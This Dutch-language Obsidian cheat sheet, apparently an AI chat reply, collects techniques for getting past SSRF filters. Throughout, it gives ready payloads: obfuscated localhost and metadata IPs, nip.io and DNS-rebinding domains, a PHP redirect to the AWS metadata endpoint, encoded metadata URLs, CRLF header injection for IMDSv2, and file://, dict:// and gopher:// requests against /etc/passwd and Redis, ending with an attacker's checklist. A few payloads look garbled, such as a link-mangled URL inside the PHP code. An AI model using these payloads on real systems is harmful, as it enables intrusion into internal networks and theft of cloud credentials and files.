Dit is inderdaad de "Boss Fight" van SSRF. Je hebt een SSRF gevonden, maar de server blokkeert inputs zoals `127.0.0.1` of `localhost`.

Hier is de complete Obsidian notitie met alle trucs om die filters te omzeilen.

---

Markdown

````
# 🛡️ SSRF Bypassing & Filter Evasion

==Doel: De beveiliging (blacklist/whitelist) omzeilen om alsnog interne IP-adressen of metadata services te bereiken.==



---

## 🔢 1. IP Obfuscation (IP Vermommen)
*Ontwikkelaars blokkeren vaak de **string** "127.0.0.1". Maar servers begrijpen IP-adressen op veel meer manieren.*

### Decimal / Octal / Hex Formats
De browser en server vertalen dit automatisch naar 127.0.0.1.

| Formaat | Payload | Uitleg |
| :--- | :--- | :--- |
| **Decimal** | `http://2130706433` | Het hele IP als één getal. |
| **Octal** | `http://0177.0.0.1` | Beginnen met een 0. |
| **Hexadecimal** | `http://0x7f000001` | Hex notatie. |
| **Dotted Hex** | `http://0x7f.0x0.0x0.0x1` | Mix van punten en hex. |
| **Overflow** | `http://425.510.425.510` | Sommige parsers "rollen over" naar geldige IPs. |

### Short Hand (Linux/Ping trick)
Je hoeft de nullen vaak niet te typen.
* `http://127.1` (Wordt 127.0.0.1)
* `http://127.0.1` (Wordt 127.0.0.1)
* `http://0` (Werkt op Linux vaak als 0.0.0.0 -> Localhost)

---

## 🌐 2. DNS Rebinding & Wildcards
*Als de server "cijfers" blokkeert, gebruik dan een domeinnaam die naar een lokaal IP wijst.*

### Magic Domains (NIP.IO / SSLIP.IO)
Diensten die automatisch resolven naar het IP dat je in de naam zet.
* `http://127.0.0.1.nip.io` -> Wijst naar `127.0.0.1`
* `http://169.254.169.254.nip.io` -> Wijst naar AWS Metadata
* `http://localhost.127.0.0.1.sslip.io`

### DNS Rebinding (Advanced)
*De techniek:*
1.  Server checkt: `attacker.com` -> IP `8.8.8.8` (Veilig! ✅).
2.  Server haalt data op: `attacker.com` -> IP `127.0.0.1` (Malicious! 😈).
*Dit vereist een eigen DNS server of een tool.*

> [!TIP] Tool: RBNDR
> Gebruik [rbndr.us](https://github.com/taviso/rbndr) om dit te testen.
> `7f000001.80808080.rbndr.us` (Wisselt tussen 127.0.0.1 en 128.128.128.128)

---

## 🔀 3. Redirect Bypasses
*Als de server HTTP Redirects (301/302) volgt, kun je hem foppen.*

**De Filter:** De server checkt jouw INPUT URL. Die is `http://evil.com` (Veilig).
**De Uitvoering:** `http://evil.com` redirect direct naar `http://127.0.0.1`. De server volgt dit vaak *zonder* opnieuw te checken.

**Maak een bestand `redirect.php` op jouw server:**
```php
<?php header("Location: [http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)"); ?>
````

Geef de target vervolgens jouw URL: `?url=http://jouw-server.com/redirect.php`.

---

## ☁️ 4. Cloud Metadata Bypasses

_AWS en Google Cloud hebben beveiligingen toegevoegd. Zo breek je ze._

### URL Encoding

Soms decodeert de filter niet, maar de backend wel. `http://169.254.169.254/latest/user-data` Wordt: `http://169.254.169.254/latest/user-data%2500` (Null byte) `http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34` (Volledig encoded)

### AWS header bypass (IMDSv2)

AWS vereist nu vaak een token (IMDSv2). Als je headers kunt injecteren (via CRLF injection):

HTTP

```
X-Aws-Ec2-Metadata-Token: [TOKEN]
```

### Google Cloud (Header Required)

Google vereist de header `Metadata-Flavor: Google`. Als je open redirects hebt op een _andere_ Google service, werkt dit soms.

---

## 👻 5. IPv6 (De Vergeten Protocol)

_Filters focussen vaak op IPv4 (`d.d.d.d`). IPv6 glipt er vaak doorheen._

- `http://[::1]` (Localhost in IPv6)
    
- `http://[::1]:80`
    
- `http://[0000::1]`
    
- **IPv4-Mapped IPv6:** `http://[::ffff:127.0.0.1]` (Dit is goud waard!)
    

---

## 🕸️ 6. Alternative Protocols (Schemes)

_Blokkeert de server `http` naar localhost? Probeer andere protocollen._

**File Protocol (LFI via SSRF):** `file:///etc/passwd` `file://\windows\win.ini`

**Dict Protocol:** `dict://127.0.0.1:6379/info` (Kan soms data uit Redis halen).

**Gopher Protocol (RCE potentieel!):** Gopher laat je ruwe bytes sturen. Hiermee kun je praten met interne services zoals Redis, SMTP of MySQL. _Gebruik de tool **Gopherus** om payloads te maken._ `gopher://127.0.0.1:6379/_...PAYLOAD...`

---

## 📦 7. Enclosed Alphanumerics (Unicode)

_Sommige systemen normaliseren vreemde tekens naar ASCII voordat ze het verzoek doen, maar NA de filter check._

- ⓵②⑦.⓪.⓪.⓵ (Enclosed Alphanumerics) -> 127.0.0.1
    
- `http://①⑥⑨.②⑤④.①⑥⑨.②⑤④/`
    

---

## 📝 Checklist SSRF Bypass

- [ ] **Formaten:** Heb ik Decimal, Octal en Hex geprobeerd?
    
- [ ] **NIP.IO:** Heb ik `127.0.0.1.nip.io` geprobeerd?
    
- [ ] **IPv6:** Heb ik `[::1]` en `[::ffff:127.0.0.1]` getest?
    
- [ ] **Redirect:** Heb ik een PHP redirect op mijn eigen server gehost?
    
- [ ] **Protocollen:** Heb ik `file://` of `gopher://` geprobeerd?
    
- [ ] **Case:** Heb ik `LocalHost` (hoofdletters) geprobeerd?
